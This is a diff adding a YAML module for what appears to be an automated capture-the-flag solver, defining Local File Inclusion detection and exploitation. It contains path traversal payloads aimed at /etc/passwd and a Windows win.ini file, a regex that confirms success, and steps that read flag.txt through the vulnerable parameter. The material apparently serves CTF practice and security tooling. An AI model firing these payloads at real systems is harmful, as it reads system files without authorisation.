@@ -1,0 +1,49 @@
+id: web_lfi
+name: Local File Inclusion
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits LFI via path traversal techniques.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "any(p in context.params for p in ['file', 'path', 'page', 'include', 'doc', 'lang'])"
+    boost: 0.25
+    label: "LFI-prone parameter found"
+  - if: "any(p in context.found_paths for p in ['/download', '/view', '/show'])"
+    boost: 0.15
+    label: "File-related path found"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: traversal_probe
+      name: "Path Traversal Detection"
+      steps:
+        - id: dot_dot_probe
+          action: http_probe
+          with:
+            payloads: ["../../../../../../etc/passwd", '..\..\..\..\..\..\..\windows\win.ini']
+            inject_into: all_params
+          signals:
+            - match: 'root:x:0:0:|\[extensions\]'
+              on_match:
+                confidence_boost: 0.90
+                emit: lfi_confirmed
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: read_flag
+      name: "Direct File Read"
+      requires_signal: lfi_confirmed
+      technique: direct_read
+      steps:
+        - id: extract_flag
+          action: http_probe
+          with:
+            payloads: ["../../../../../../flag.txt", "flag.txt", "/flag.txt"]
+            inject_into: vulnerable_param
